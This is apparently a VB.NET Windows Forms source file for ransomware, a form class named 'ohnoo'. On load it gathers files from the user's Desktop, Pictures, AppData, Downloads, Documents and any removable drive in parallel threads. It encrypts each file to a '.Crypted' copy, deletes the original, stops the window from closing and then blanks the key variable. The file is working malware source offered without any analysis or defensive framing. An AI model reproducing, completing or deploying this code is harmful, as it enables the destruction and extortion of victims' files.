Imports System.Security.Principal
Imports System.Runtime.InteropServices
Imports System.Text

Public Class ohnoo

    Const S_OK As Integer = 0
    Const E_FAIL As Integer = &H80004005
    Const E_INVALIDARG As Integer = &H80070057

    Public Flie As String ' 
    <DllImport("shell32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SHGetKnownFolderPath(ByRef id As Guid, flags As Integer, token As IntPtr, ByRef path As StringBuilder) As Integer
    End Function
    Dim T1, T2, T3, T4, T5, T6 As Threading.Thread
    Dim FilesGet_Done As Boolean = False
    Dim Encrpt_Done As Boolean = False

    Public Shared Function GetDownloadsFolder() As String

        ' Known folder GUIDs at:
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/dd378457%28v=vs.85%29.aspx

        Dim FOLDERID_Downloads As Guid = New Guid("374DE290-123F-4565-9164-39C4925E467B")
        Dim sb As New StringBuilder

        Dim hresult As Integer = SHGetKnownFolderPath(FOLDERID_Downloads, 0, IntPtr.Zero, sb)

        Select Case hresult
            Case S_OK
                Return sb.ToString()
            Case E_FAIL
                Throw New ArgumentException(String.Format("KNOWNFOLDERID GUID {0} (Downloads) does not have a path.", FOLDERID_Downloads))
            Case E_INVALIDARG
                Throw New ArgumentException(String.Format("Known folder with GUID {0} (Downloads) is not present on the system.", FOLDERID_Downloads))
            Case Else
                Throw New Exception(String.Format("GetDownloadsFolder function failed, unexpected HRESULT = 0x{0:X}.", hresult))
        End Select

    End Function
    Function isadmin() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        If isElevated Then
            isadmin = True
        Else
            isadmin = False
        End If
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Clipboard.SetText(TextBox1.Text)
    End Sub

    Private Sub ohnoo_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub


    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
        Me.Text = ListBox1.SelectedItem
    End Sub
    Private Sub GetDrivetype(ByVal drive As String)
        Try
            Dim Drive_Info As System.IO.DriveInfo
            Drive_Info = New System.IO.DriveInfo(drive)
            Label1.Text = Drive_Info.DriveType.ToString
        Catch ex As Exception
            MsgBox(ex.Data)
        End Try
    End Sub
    Sub Getf1()
        Dim desktopfiles As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\"
        For Each d As String In DirSearch(desktopfiles)
            ListBox1.Items.Add(d)
        Next
    End Sub
    Sub get2()
        Dim Picfiles As String = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) & "\"
        For Each d As String In DirSearch(Picfiles)
            ListBox2.Items.Add(d)
        Next
    End Sub
    Sub get3()
        Dim VideFiles As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\"
        For Each d As String In DirSearch(VideFiles)
            ListBox3.Items.Add(d)
        Next
    End Sub
    Sub Get4()
        Dim lib1 As String = GetDownloadsFolder()
        For Each d As String In DirSearch(lib1)
            ListBox4.Items.Add(d)
        Next
    End Sub
    Sub Get5()

        Dim docu_filez As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        For Each d As String In DirSearch(docu_filez)
            ListBox5.Items.Add(d)
        Next

    End Sub
    Sub Get6()
        Dim USB_path As String
        Dim drives As String() = System.IO.Directory.GetLogicalDrives
        For Each drive As String In drives
            Dim drvinfo As New IO.DriveInfo(drive)
            If drvinfo.DriveType = IO.DriveType.Removable Then
                USB_path = drive
            End If
        Next
        For Each d As String In DirSearch(USB_path)
            ListBox6.Items.Add(d)
        Next
        FilesGet_Done = True

    End Sub
    Sub Getthemfilz()

        T1 = New Threading.Thread(AddressOf Getf1)
        T1.IsBackground = True
        T1.Start()


        T2 = New Threading.Thread(AddressOf get2)
        T2.IsBackground = True
        T2.Start()

        T3 = New Threading.Thread(AddressOf get3)
        T3.IsBackground = True
        T3.Start()

        T4 = New Threading.Thread(AddressOf Get4)
        T4.IsBackground = True
        T4.Start()

        T5 = New Threading.Thread(AddressOf Get5)
        T5.IsBackground = True
        T5.Start()

        T6 = New Threading.Thread(AddressOf Get6)
        T6.IsBackground = True
        T6.Start()
    End Sub
    Sub Crpt1()
        For Each file As String In ListBox1.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Crpt2()
        For Each file As String In ListBox2.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Crpt3()
        For Each file As String In ListBox3.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Crpt4()
        For Each file As String In ListBox4.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Crpt5()
        For Each file As String In ListBox5.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Crpt6()
        For Each file As String In ListBox6.Items
            If Not file = Application.ExecutablePath Then
                Dim k As New ElgAESCrypt(Flie)
                Dim newname As String = file & ".Crypted"
                k.EncrypterFichier(file, newname)
                IO.File.Delete(file)
            End If
        Next
    End Sub
    Sub Cryptall()
        'Flie = RC4Decrypt(Flie, "bCoDkZ3QTETLNnOzpT4e")
        T1 = New Threading.Thread(AddressOf Crpt1)
        T1.IsBackground = True
        T1.Start()


        T2 = New Threading.Thread(AddressOf Crpt2)
        T2.IsBackground = True
        T2.Start()

        T3 = New Threading.Thread(AddressOf Crpt3)
        T3.IsBackground = True
        T3.Start()

        T4 = New Threading.Thread(AddressOf Crpt4)
        T4.IsBackground = True
        T4.Start()

        T5 = New Threading.Thread(AddressOf Crpt5)
        T5.IsBackground = True
        T5.Start()

        T6 = New Threading.Thread(AddressOf Crpt6)
        T6.IsBackground = True
        T6.Start()
    End Sub
    


    Private Sub ohnoo_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Control.CheckForIllegalCrossThreadCalls = False
        Dim o = New Threading.Thread(AddressOf Getthemfilz)
        o.IsBackground = True
        o.Start()
        Timer2.Start()

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If T1.IsAlive = False And T2.IsAlive = False And T3.IsAlive = False And T4.IsAlive = False And T5.IsAlive = False And T6.IsAlive = False Then
            Me.Opacity = 100
            Flie = ""
            Timer1.Stop()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If FilesGet_Done = True Then
            Try

                Dim l = New Threading.Thread(AddressOf Cryptall)
                l.Priority = Threading.ThreadPriority.Highest
                l.IsBackground = True
                l.Start()

                Timer2.Stop()
                Timer1.Start()
            Catch excpt As System.Exception
                Timer2.Stop()
            End Try
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        PictureBox1.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\ds.png")
    End Sub
End Class